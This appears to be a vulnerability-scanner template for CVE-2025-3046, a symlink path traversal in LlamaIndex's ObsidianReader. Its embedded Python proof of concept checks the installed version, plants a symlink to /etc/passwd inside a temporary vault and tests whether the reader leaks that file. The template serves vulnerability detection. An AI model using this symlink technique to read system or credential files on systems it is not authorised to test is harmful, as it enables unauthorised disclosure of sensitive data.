id: CVE-2025-3046

info:
  name: LlamaIndex - ObsidianReader Path Traversal
  author: pdresearch
  severity: high
  description: |
    Path traversal vulnerability in run-llama/llama_index versions 0.12.23 to 0.12.28 in ObsidianReader due to improper symlink resolution. Attackers can read arbitrary files outside the intended directory by placing symlinks.
  reference:
    - https://huntr.com/bounties/90a1f1b2-bb82-4d66-9fc1-856ed5f904da
    - https://nvd.nist.gov/vuln/detail/CVE-2025-3046
  classification:
    cvss-metrics: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 5.5
    cve-id: CVE-2025-3046
    cwe-id: CWE-22
    epss-score: 0.00043
    epss-percentile: 0.08235
    cpe: cpe:2.3:a:run-llama:llama_index:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    vendor: run-llama
    product: llama_index
  tags: cve,cve2025,path-traversal,llamaindex,obsidian,symlink,vuln

code:
  - engine:
      - py
      - python3
    source: |
      import os
      import tempfile
      import shutil
      from pathlib import Path

      def check_llamaindex_version():
          try:
              import llama_index
              version = llama_index.__version__
              version_parts = version.split('.')
              major = int(version_parts[0])
              minor = int(version_parts[1])
              patch = int(version_parts[2])

              # Check if version is between 0.12.23 and 0.12.28 inclusive
              if major == 0 and minor == 12 and 23 <= patch <= 28:
                  return True, version
              return False, version
          except ImportError:
              return False, "not_installed"
          except Exception as e:
              return False, f"error: {str(e)}"

      def test_path_traversal():
          try:
              from llama_index.readers.obsidian import ObsidianReader

              # Create temporary directory structure
              with tempfile.TemporaryDirectory() as temp_dir:
                  temp_path = Path(temp_dir)

                  # Create obsidian vault directory
                  vault_dir = temp_path / "obsidian_vault"
                  vault_dir.mkdir()

                  # Create a test file in the vault
                  test_file = vault_dir / "test.md"
                  test_file.write_text("# Test Content")

                  # Create a symlink pointing outside the vault (path traversal)
                  symlink_file = vault_dir / "evil_link.md"
                  # Point to /etc/passwd or similar system file
                  target_file = "/etc/passwd"
                  if os.path.exists(target_file):
                      try:
                          os.symlink(target_file, symlink_file)
                      except OSError:
                          # If symlink creation fails, try relative path
                          try:
                              os.symlink("../../../../../etc/passwd", symlink_file)
                          except OSError:
                              return False, "cannot_create_symlink"

                      # Try to load the obsidian vault
                      try:
                          reader = ObsidianReader(str(vault_dir))
                          documents = reader.load_data()

                          # Check if any document contains content from outside the vault
                          for doc in documents:
                              content = doc.text_content or ""
                              # Look for passwd file content patterns
                              if "root:" in content or "/bin/bash" in content or "/bin/sh" in content:
                                  return True, "vulnerable_path_traversal_detected"
                      except Exception as e:
                          return False, f"reader_error: {str(e)}"
                  else:
                      return False, "target_file_not_found"

          except ImportError:
              return False, "obsidian_reader_not_available"
          except Exception as e:
              return False, f"unexpected_error: {str(e)}"

          return False, "no_vulnerability_detected"

      def main():
          # First check version
          vulnerable_version, version_info = check_llamaindex_version()
          if not vulnerable_version:
              if version_info == "not_installed":
                  print("llamaindex_not_installed")
              else:
                  print(f"version_not_vulnerable:{version_info}")
              return

          # Version is vulnerable, test the path traversal
          vulnerable, result = test_path_traversal()
          if vulnerable:
              print(f"vulnerable:{result}")
          else:
              print(f"not_vulnerable:{result}")

      if __name__ == "__main__":
          main()

    matchers:
      - type: word
        words:
          - "vulnerable:vulnerable_path_traversal_detected"

    extractors:
      - type: dsl
        dsl:
          - response
# digest: 4a0a00473045022100b8f8c4a5d2e9f3a7b6c8e2d4f1a9b8c7e6d5f4a3b2c1e0d9f8a7b6c5e42100a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9:922c64590222798bb761d5b6d8e72950

